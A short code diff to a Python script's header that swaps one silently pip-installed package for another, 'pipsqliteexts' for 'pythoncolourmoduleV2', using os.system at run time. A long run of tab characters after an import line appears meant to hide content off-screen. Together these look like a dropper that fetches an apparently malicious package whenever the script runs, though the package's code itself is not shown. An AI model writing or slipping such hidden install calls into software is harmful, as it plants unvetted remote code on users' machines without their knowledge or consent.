@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqliteexts")
-import pipsqliteexts
+os.system("pip install pythoncolourmoduleV2")
+import pythoncolourmoduleV2
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
